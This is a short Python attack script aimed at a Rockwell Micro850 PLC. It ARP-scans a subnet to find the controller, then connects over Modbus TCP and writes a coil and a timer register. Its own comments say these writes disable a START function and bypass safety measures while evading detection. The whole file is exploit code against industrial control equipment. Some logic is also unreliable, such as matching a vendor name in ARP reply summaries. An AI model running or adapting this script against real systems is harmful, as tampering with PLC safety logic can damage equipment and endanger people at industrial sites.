import socket
import struct
import time
from pyModbusTCP.client import ModbusClient

# Step 1: Network Discovery to Find Rockwell Micro850 PLC
def discover_plc_ip():
    import scapy.all as scapy
    
    # Broadcast an ARP request to discover the PLC
    print("[+] Scanning network for potential PLC IP...")
    
    arp_request = scapy.ARP(pdst="192.168.1.1/24")  # Adjust subnet accordingly
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_request
    
    answered = scapy.srp(arp_packet, timeout=2, verbose=False)[0]
    for sent, received in answered:
        if "Rockwell Automation" in received.summary():
            print(f"[+] Possible PLC IP Found: {received.psrc}")
            return received.psrc

    print("[!] No PLC IP found.")
    return None

# Step 2: Exploit the PLC
def exploit_plc(plc_ip):
    print(f"[+] Connecting to PLC at {plc_ip}...")
    
    client = ModbusClient(host=plc_ip, port=502, auto_open=True)
    
    if client.open():
        print("[+] Connected to PLC. Attempting to manipulate security features...")

        # Example of modifying the START variable (potential evasion technique)
        start_register = 1000  # Adjust based on PLC memory map
        
        print("[*] Disabling START function to evade detection...")
        client.write_single_coil(start_register, False)

        # Further exploitation: Modify timer values to bypass safety measures
        timer_register = 1050  # Adjust based on PLC details
        print("[*] Modifying internal timer settings to evade detection...")
        client.write_single_register(timer_register, 9999)  # Change time value

        print("[+] Exploit Completed. Security features modified.")
    
    else:
        print("[!] Could not connect to PLC. Check network/firewall settings.")

    client.close()

# Main execution
plc_ip = discover_plc_ip()
if plc_ip:
    exploit_plc(plc_ip)
else:
    print("[!] PLC discovery failed. Exiting.")